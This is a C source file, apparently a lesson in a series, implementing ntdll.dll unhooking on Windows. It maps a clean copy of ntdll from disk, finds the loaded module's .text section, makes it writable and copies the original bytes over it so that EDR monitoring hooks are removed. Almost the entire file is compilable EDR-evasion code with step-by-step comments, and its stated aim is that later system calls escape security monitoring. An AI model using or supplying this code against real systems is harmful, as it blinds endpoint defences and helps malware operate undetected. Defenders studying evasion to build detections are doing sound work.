/*
 * 06_ntdll_unhooking.c
 * =====================
 * ntdll.dll Unhooking - Restores original bytes by removing EDR hooks
 *
 * When the EDR loads into your process, it modifies ntdll.dll in memory:
 * it replaces the first bytes of functions (e.g.: NtAllocateVirtualMemory)
 * with a JMP to its monitoring code.
 *
 * This technique loads a CLEAN copy of ntdll.dll directly from disk
 * and overwrites the .text section of ntdll in memory with the original bytes.
 * Result: all EDR hooks are removed at once.
 *
 * There are several sources of clean ntdll:
 *   1. C:\Windows\System32\ntdll.dll (from disk)
 *   2. \KnownDlls\ntdll.dll (kernel object directory)
 *   3. ntdll from another process (via ReadProcessMemory)
 *
 * This example uses option 1 (from disk) as it is the simplest.
 *
 * Compile: cl.exe /O2 06_ntdll_unhooking.c
 */

#include <windows.h>
#include <stdio.h>

/*
 * Basic PE header structures we need to parse.
 * Every .exe and .dll on Windows follows the PE (Portable Executable) format.
 *
 * The structure is:
 *   DOS Header (starts with "MZ")
 *   -> e_lfanew points to NT Header
 *   NT Header (starts with "PE\0\0")
 *   -> FileHeader (info about the machine, number of sections)
 *   -> OptionalHeader (entry point, image base, etc)
 *   Section Headers (array of IMAGE_SECTION_HEADER)
 *   -> each section: .text (code), .data, .rsrc, etc
 */

int main() {

    printf("[*] ntdll.dll Unhooking\n\n");

    /* ---------------------------------------------------------------
     * STEP 1: Get the base address of ntdll.dll in memory
     *
     * GetModuleHandleA returns the address where the DLL is loaded
     * in our process. This is the version HOOKED by the EDR.
     *
     * An HMODULE is basically a pointer to the beginning of the DLL in memory.
     * Cast to (LPVOID) because we'll treat it as raw bytes.
     * --------------------------------------------------------------- */
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) {
        printf("[!] ntdll.dll not found\n");
        return 1;
    }
    printf("[+] ntdll.dll in memory (hooked): 0x%p\n", hNtdll);

    /* ---------------------------------------------------------------
     * STEP 2: Map a CLEAN copy of ntdll.dll from disk
     *
     * CreateFileA -> opens the file for reading
     * CreateFileMappingA -> creates a "mapping" of the file in memory
     * MapViewOfFile -> projects the file contents into our memory
     *
     * The difference between "reading a file" and "mapping": when we map,
     * Windows projects the content directly into virtual memory.
     * We don't need to allocate a buffer and read with ReadFile - the OS handles it.
     *
     * FILE_MAP_READ = read only (we don't want to modify the original file)
     *
     * IMPORTANT: this mapping contains the ORIGINAL ntdll, without hooks.
     * The hooks only exist in the copy that is ALREADY loaded in the process.
     * --------------------------------------------------------------- */
    HANDLE hFile = CreateFileA(
        "C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ,        /* read only */
        FILE_SHARE_READ,     /* other processes can read simultaneously */
        NULL,                /* no special security */
        OPEN_EXISTING,       /* the file must exist */
        0,                   /* no special flags */
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] Failed to open ntdll.dll from disk. Error: %lu\n", GetLastError());
        return 1;
    }

    HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (hMapping == NULL) {
        printf("[!] Mapping failed. Error: %lu\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }

    /*
     * SEC_IMAGE makes Windows parse the PE and map the sections
     * at the correct virtual offsets (as if it had "loaded" the DLL).
     * This way we can compare directly with the in-memory version.
     */
    LPVOID cleanNtdll = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (cleanNtdll == NULL) {
        printf("[!] Failed to map. Error: %lu\n", GetLastError());
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return 1;
    }

    printf("[+] Clean ntdll.dll mapped at: 0x%p\n", cleanNtdll);

    /* ---------------------------------------------------------------
     * STEP 3: Find the .text section in the hooked ntdll
     *
     * The .text section contains the EXECUTABLE CODE of the DLL.
     * That's where the functions are (NtAllocateVirtualMemory, etc)
     * and that's where the EDR hooks were installed.
     *
     * We parse the PE headers to find:
     *   - The offset of the .text section
     *   - The size of the .text section
     * --------------------------------------------------------------- */

    /* DOS Header starts at the beginning of the DLL */
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hNtdll;

    /* NT Header is at the offset indicated by e_lfanew */
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(
        (BYTE*)hNtdll + dosHeader->e_lfanew
    );

    /*
     * Section Headers are located right after the Optional Header.
     * IMAGE_FIRST_SECTION is a macro that calculates the correct offset.
     * Returns an array of IMAGE_SECTION_HEADER.
     */
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    WORD numSections = ntHeaders->FileHeader.NumberOfSections;

    printf("[*] Searching for .text section...\n");

    for (WORD i = 0; i < numSections; i++) {
        /*
         * section[i].Name contains the section name (8 bytes max).
         * We compare with ".text" to find the code section.
         */
        if (strcmp((char*)section[i].Name, ".text") == 0) {

            printf("[+] .text section found!\n");
            printf("    Offset: 0x%lx\n", section[i].VirtualAddress);
            printf("    Size: %lu bytes\n", section[i].Misc.VirtualSize);

            /* Pointer to .text of the HOOKED ntdll (in memory) */
            LPVOID hookedText = (LPVOID)((BYTE*)hNtdll + section[i].VirtualAddress);

            /* Pointer to .text of the CLEAN ntdll (from disk) */
            LPVOID cleanText = (LPVOID)((BYTE*)cleanNtdll + section[i].VirtualAddress);

            DWORD textSize = section[i].Misc.VirtualSize;

            /* ---------------------------------------------------------------
             * STEP 4: Change .text permission to writable
             *
             * The .text section is normally RX (Read + Execute).
             * We need to make it temporarily RWX to be able to
             * overwrite the hooked bytes.
             * --------------------------------------------------------------- */
            DWORD oldPermission = 0;
            VirtualProtect(hookedText, textSize, PAGE_EXECUTE_READWRITE, &oldPermission);

            /* ---------------------------------------------------------------
             * STEP 5: Copy clean bytes over hooked bytes
             *
             * This is the crucial moment: we copy the ENTIRE .text section
             * from the clean ntdll (from disk) over the hooked ntdll (in memory).
             *
             * All EDR JMP hooks are replaced with the original bytes.
             * The functions return to their normal state.
             * --------------------------------------------------------------- */
            memcpy(hookedText, cleanText, textSize);

            printf("[+] %lu bytes copied - HOOKS REMOVED!\n", textSize);

            /* Restore original permission (RX) */
            VirtualProtect(hookedText, textSize, oldPermission, &oldPermission);
            printf("[+] Permission restored\n");

            break;
        }
    }

    /* Clean up mapping */
    UnmapViewOfFile(cleanNtdll);
    CloseHandle(hMapping);
    CloseHandle(hFile);

    printf("\n[+] ntdll.dll unhooked! Now all Nt functions are clean.\n");
    printf("[*] From here on, normal calls to ntdll no longer pass through EDR hooks.\n");

    return 0;
}
